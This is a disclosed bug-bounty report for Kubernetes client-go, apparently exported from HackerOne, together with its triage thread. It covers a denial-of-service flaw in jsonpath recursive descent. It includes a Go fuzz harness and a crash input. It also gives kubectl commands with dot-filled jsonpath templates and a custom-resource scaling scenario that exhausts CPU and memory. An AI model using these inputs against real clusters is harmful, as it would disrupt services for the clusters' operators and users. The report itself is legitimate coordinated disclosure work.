{"id":882923,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODI5MjM=","url":"https://hackerone.com/reports/882923","title":"DoS for client-go jsonpath func","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-05-26T15:31:15.487Z","submitted_at":"2020-05-26T15:31:15.487Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"lazydog","url":"/lazydog","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":39386,"url":"https://hackerone.com/kubernetes","handle":"kubernetes","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Kubernetes","twitter_handle":"kubernetesio","website":"https://kubernetes.io/","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-07-24T03:46:15.593Z","bug_reporter_agreed_on_going_public_at":"2020-07-24T03:46:15.531Z","team_member_agreed_on_going_public_at":"2020-07-23T23:14:24.782Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\njsonpath recursive descent  cause a DoS vul\n`kubectl` `apiextensions-apiserver` `cli-runtime` and `kubernetes` is depends on `client-go`\n\nI think `evalRecursive()` cause of this vulnerability\nfunction pos: client-go/util/jsonpath/jsonpath.go:451\n\n## Component Version:\n\nclient-go:master\n\n## Steps To Reproduce:\ni written a simple fuzz based on  go-fuzz, im so lucky to found a crasher.\n\n  1. pull the latest kubernetes code \n\n```\ngit clone https://github.com/kubernetes/kubernetes\n```\n\n  2.change workdir to  `kubernetes/staging/src/k8s.io/client-go/util/jsonpath`\n3.copy this poc to disk use `vim` or `cat`, change filename to `crash_tests.go`\n\n```\npackage jsonpath\n\nimport (\n\t\"testing\"\n \t\"bytes\"\n \t\"encoding/json\"\n)\n\ntype jsonpathcrashTest struct {\n name     string\n template string\n input    interface{}\n}\n\nfunc FuzzParse(test *jsonpathcrashTest, allowMissingKeys bool) error {\n\n j := New(test.name)\n\n j.AllowMissingKeys(allowMissingKeys)\n err := j.Parse(test.template)\n if err != nil {\n  return err\n }\n\n buf := new(bytes.Buffer)\n err = j.Execute(buf, test.input)\n if err != nil {\n  return err\n }\n\n return err\n}\n\nfunc Fuzz(data []byte) int {\n var input = []byte(`{\n  \"kind\": \"List\",\n  \"items\":[\n    {\n   \"kind\":\"None\",\n   \"metadata\":{\n     \"name\":\"127.0.0.1\",\n     \"labels\":{\n    \"kubernetes.io/hostname\":\"127.0.0.1\"\n     }\n   },\n   \"status\":{\n     \"capacity\":{\"cpu\":\"4\"},\n     \"ready\": true,\n     \"addresses\":[{\"type\": \"LegacyHostIP\", \"address\":\"127.0.0.1\"}]\n   }\n    },\n    {\n   \"kind\":\"None\",\n   \"metadata\":{\n     \"name\":\"127.0.0.2\",\n     \"labels\":{\n    \"kubernetes.io/hostname\":\"127.0.0.2\"\n     }\n   },\n   \"status\":{\n     \"capacity\":{\"cpu\":\"8\"},\n     \"ready\": false,\n     \"addresses\":[\n    {\"type\": \"LegacyHostIP\", \"address\":\"127.0.0.2\"},\n    {\"type\": \"another\", \"address\":\"127.0.0.3\"}\n     ]\n   }\n    }\n  ],\n  \"users\":[\n    {\n   \"name\": \"myself\",\n   \"user\": {}\n    },\n    {\n   \"name\": \"e2e\",\n   \"user\": {\"username\": \"admin\", \"password\": \"secret\"}\n   }\n  ]\n   }`)\n\n var nodesData interface{}\n err := json.Unmarshal(input, \u0026nodesData)\n if err != nil {\n  print(err)\n }\n\n fuzzData := string(data)\n\n test := jsonpathcrashTest{name: \"crash\", template: fuzzData, input: nodesData}\n\n err = FuzzParse(\u0026test, false)\n if err != nil {\n  return 0\n }\n\n err = FuzzParse(\u0026test, true)\n if err != nil {\n  return 0\n }\n\n return 1\n}\n\n\nfunc TestCrash(t *testing.T) {\n\tvar data = []byte(\"{...................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"..........51}.\")\n\tFuzz(data)\n}\n\n```\n\n\n\n4.run `go test` command, now we can see the test process use a lot of cpu and memeory\n\n\n{F843537}\n\n5.i found a real case in `kubectl`, if resource (like services pods node) has any record can cause DoS.\n\n```\nkubectl get services -o=jsonpath=\"{.....................................................................................................................................}\"\n```\n\n{F843557}\n\n## Impact\n\nmaybe in some scenes, attacker can cause DoS.\n\neg. cloud components use `client-go` util to process cluster resouce json record.\n\nany other program exec  `kubectl`  with jsonpath options, and jsonpath params by user control.","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":843537,"file_name":"DoS_1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MyFnNJByUQBDCfzH84SLw64Y?response-content-disposition=attachment%3B%20filename%3D%22DoS_1.png%22%3B%20filename%2A%3DUTF-8%27%27DoS_1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153746Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b78e06a6bdee905f6d4055656e12a70ef92c4804407f36321afd29d50d018d37","file_size":107584,"type":"image/png"},{"id":843557,"file_name":"DoS_2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tuskrXgGKWjsHmiPY5Z2kXXd?response-content-disposition=attachment%3B%20filename%3D%22DoS_2.png%22%3B%20filename%2A%3DUTF-8%27%27DoS_2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153746Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4fbef81aeb5dbd359855ef607bd3ba6356bce7ad93fcf515e083ed6519497193","file_size":65773,"type":"image/png"}],"allow_singular_disclosure_at":"2020-08-22T23:14:24.943Z","allow_singular_disclosure_after":-35828601.381715015,"singular_disclosure_allowed":true,"vote_count":6,"voters":["lazydog","yxw21","realtess","muh3ammed","h1-qualys-scan","th3_"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":{"databaseId":32505,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/kubernetes/client-go","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8118016,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @lazydog,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@turtle_shell","automated_response":false,"created_at":"2020-05-27T11:49:27.771Z","updated_at":"2020-05-27T11:49:27.771Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8118335,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @lazydog and thanks for your report,\n\nI was running\n\n```\nkubectl get services -o=jsonpath=\"{.....................................................................................................................................}\"\n```\n\nBut that process never go on top of my processes for CPU usage. The top one is Google Chrome with 20%. How else are you monitoring the CPU usage? I am running the following command `top -F -R -o cpu`.\nI have to say that our Mac Pro are quite powerful, but if it can't overcome Google Chrome then I am sure it's not hurting anything. What is the environment you are testing on?\n\nBest regards,\n@turtle_shell","automated_response":false,"created_at":"2020-05-27T12:28:07.611Z","updated_at":"2020-05-27T12:28:07.611Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8118829,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi, @turtle_shell \n\n`kubectl get services`  has any output? if in your environment this command without any output,I think it will not cause any impact.\n\nIn my environment , this command will output two services json result.\n{F844905}\n\nCan you testing with minikube environment? i think it will be reproduce this problem.\n\nMaybe need add some dot to jsonpath, because the more dot char cause the more recursive processing and buffer will allocate more memory.\n\nexample:\n\n`kubectl get services -o=jsonpath=\"{........................................................................................................................................................................................................}\"`","automated_response":false,"created_at":"2020-05-27T13:10:58.959Z","updated_at":"2020-05-27T13:16:32.341Z","actor":{"username":"lazydog","cleared":false,"url":"/lazydog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":844905,"filename":"result.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6MATbPqwNRLeBhqvj1AqGVo9?response-content-disposition=attachment%3B%20filename%3D%22result.png%22%3B%20filename%2A%3DUTF-8%27%27result.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153746Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8a80d89b12940088970561ef92f763e0d5d443e6679f1f3c4bb5d1725c3b87df"}],"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8177645,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @lazydog,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@turtle_shell","automated_response":false,"created_at":"2020-06-02T11:20:43.710Z","updated_at":"2020-06-02T11:20:43.710Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8177703,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-06-02T11:28:05.884Z","updated_at":"2020-06-02T11:28:05.884Z","additional_data":{"old_severity":"High (7.5)","new_severity":"Medium (5.5)","old_severity_id":732269,"new_severity_id":738808},"actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8239125,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey @lazydog,\n\n`kubectl` is a software that runs client-side and the resource exhaustion is caused by the victim himself with the scenario you proposed. Can you please clarify how an attacker is able to perform this attack without the victim having to attack himself?\n\nBest regards,\n@turtle_shell","automated_response":false,"created_at":"2020-06-09T06:47:29.763Z","updated_at":"2020-06-09T06:47:29.763Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8242740,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @turtle_shell ,\n\nSorry for the delay in responding, i found a new attack scenes (authorized api request).\n\nin `apiextensions.k8s.io/v1` we can create a customresource, attacker can control `additionalPrinterColumns` field cause a DoS attack.\n\nMy env:\n```\nClient Version: version.Info{Major:\"1\", Minor:\"18\", GitVersion:\"v1.18.3\", GitCommit:\"2e7996e3e2712684bc73f0dec0200d64eec7fe40\", GitTreeState:\"clean\", BuildDate:\"2020-05-20T12:52:00Z\", GoVersion:\"go1.13.9\", Compiler:\"gc\", Platform:\"linux/amd64\"}\nServer Version: version.Info{Major:\"1\", Minor:\"18\", GitVersion:\"v1.18.3\", GitCommit:\"2e7996e3e2712684bc73f0dec0200d64eec7fe40\", GitTreeState:\"clean\", BuildDate:\"2020-05-20T12:43:34Z\", GoVersion:\"go1.13.9\", Compiler:\"gc\", Platform:\"linux/amd64\"}\n```\n\nSteps To Reproduce:\n1. setup a k8s cluster env, use `kubeadm init`.\n2. use two poc file to create malicious apiresource\n\n```\nkubectl create -f poc_1.yaml\nkubectl create -f poc_2.yaml\nkubectl scale --replicas=10000 mykinds/test-scale\n```\n\n{F860585}\n\n{F860586}\n\n 3.  if step 2 all command is success, now execute this command we can cause a dos attack via apiserver\n```\nkubectl  get mykinds --all-namespaces\n```\n{F860598}\n\n\nReferences:\n\nhttps://github.com/kubernetes/apiextensions-apiserver/blob/master/pkg/registry/customresource/tableconvertor/tableconvertor.go#L104\n\nBest regards,\n@lazydog","automated_response":false,"created_at":"2020-06-09T13:21:19.953Z","updated_at":"2020-06-09T13:23:55.325Z","actor":{"username":"lazydog","cleared":false,"url":"/lazydog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":860598,"filename":"new_poc.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5YhAfaoxrvB18EVbiC7cbWZ7?response-content-disposition=attachment%3B%20filename%3D%22new_poc.png%22%3B%20filename%2A%3DUTF-8%27%27new_poc.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153746Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7a41118a6677d78d4c741db6cc8aad90bda5bef5ac690fd8a4c84472f85f1472"},{"id":860586,"filename":"poc_2.yaml","type":"application/x-yaml","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rnU1QkJy3LcuNDRvQuBJNyoR?response-content-disposition=attachment%3B%20filename%3D%22poc_2.yaml%22%3B%20filename%2A%3DUTF-8%27%27poc_2.yaml\u0026response-content-type=application%2Fx-yaml\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153746Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d52bdb0433bd7054b9760b596a01362fff66175038c835af967fdaf066d55007"},{"id":860585,"filename":"poc_1.yaml","type":"application/x-yaml","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3b1Jtc2TafK58J4cy8nFZ9Ft?response-content-disposition=attachment%3B%20filename%3D%22poc_1.yaml%22%3B%20filename%2A%3DUTF-8%27%27poc_1.yaml\u0026response-content-type=application%2Fx-yaml\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153746Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2Sze